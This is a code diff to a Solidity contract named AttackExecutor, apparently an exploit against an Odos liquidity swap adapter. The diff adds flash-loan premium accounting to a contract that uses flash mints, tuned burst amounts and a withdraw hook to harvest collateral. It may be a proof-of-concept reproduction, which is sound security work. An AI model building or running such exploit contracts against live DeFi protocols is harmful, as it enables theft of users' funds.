@@ -37,6 +37,7 @@ contract AttackExecutor is Ownable, IWithdrawHook {
     address public microDistributorTwo;
 
     uint256 public flashLoanAmount;
+    uint256 public flashLoanPremium;
     bool public flashMintActive;
 
     uint256 private constant FLASH_MINT_AMOUNT = 27_000 * 1e18;
@@ -52,6 +53,7 @@ contract AttackExecutor is Ownable, IWithdrawHook {
     uint256 private constant BURST_ONE = 26_230_630_089;
     uint256 private constant BURST_TWO = 8_877_536_706;
     uint256 private constant OUTPUT_DUST = 0;
+    uint256 private constant FLASH_LOAN_PREMIUM_BPS = 5;
 
     error InvalidPool(address provided);
     error UnauthorizedPool(address sender, address expected);
@@ -114,9 +116,12 @@ contract AttackExecutor is Ownable, IWithdrawHook {
         IOdosLiquiditySwapAdapter.PermitInput calldata permitInput
     ) external onlyOwner {
         flashLoanAmount = 0;
+        flashLoanPremium = 0;
 
         if (params.withFlashLoan) {
             flashLoanAmount = params.collateralAmountToSwap;
+            flashLoanPremium = _computePremium(flashLoanAmount);
+            flashLoanAmount = flashLoanAmount + flashLoanPremium;
             _startFlashMint();
         } else {
             flashMintActive = false;
@@ -156,7 +161,6 @@ contract AttackExecutor is Ownable, IWithdrawHook {
             revert("UNEXPECTED_TOKENS");
         }
 
-        flashLoanAmount = amountPulled;
         emit FlashLoanRecorded(amountPulled);
 
         if (flashMintActive) {
@@ -189,6 +193,7 @@ contract AttackExecutor is Ownable, IWithdrawHook {
         emit FlashMintSettled(FLASH_MINT_AMOUNT);
         flashMintActive = false;
         flashLoanAmount = 0;
+        flashLoanPremium = 0;
     }
 
     function _simulateCollateralHarvest() internal {
@@ -269,5 +274,9 @@ contract AttackExecutor is Ownable, IWithdrawHook {
 
         emit DusdFanOut(address(splitter), microDistributorOne, MICRO_DISTRIBUTOR_ONE);
         emit DusdFanOut(address(splitter), microDistributorTwo, MICRO_DISTRIBUTOR_TWO);
+    }
+
+    function _computePremium(uint256 amountPulled) private pure returns (uint256) {
+        return (amountPulled * FLASH_LOAN_PREMIUM_BPS) / 10_000;
     }
 }
